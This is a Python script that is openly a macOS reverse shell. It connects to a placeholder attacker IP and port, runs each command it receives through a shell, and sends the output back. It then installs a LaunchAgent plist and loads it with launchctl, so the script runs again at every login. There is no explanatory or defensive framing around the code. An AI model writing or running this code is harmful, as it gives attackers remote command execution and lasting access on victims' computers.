import socket
import subprocess
import os

# Replace the following values with your own IP address and port number
HOST = 'your_ip_address'
PORT = your_port_number

# Create a socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    # Connect to the attacker's machine
    s.connect((HOST, PORT))

    while True:
        # Receive the command from the attacker
        command = s.recv(1024).decode()

        if command.lower() == 'exit':
            break

        # Execute the command and retrieve the output
        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                  stdin=subprocess.PIPE)

        # Send the output back to the attacker
        s.send(output.stdout.read())
        s.send(output.stderr.read())

except socket.error as e:
    print(f"Socket error: {str(e)}")

finally:
    # Close the connection
    s.close()

# Add persistence by creating a launch agent
launch_agent_path = os.path.expanduser("~/Library/LaunchAgents/reverse_shell.plist")

launch_agent_content = f'''
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>reverse_shell</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{os.path.abspath(__file__)}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
'''

try:
    with open(launch_agent_path, 'w') as f:
        f.write(launch_agent_content)
    subprocess.run(['launchctl', 'load', launch_agent_path])
    print("Persistence added successfully.")

except Exception as e:
    print(f"Error adding persistence: {str(e)}")
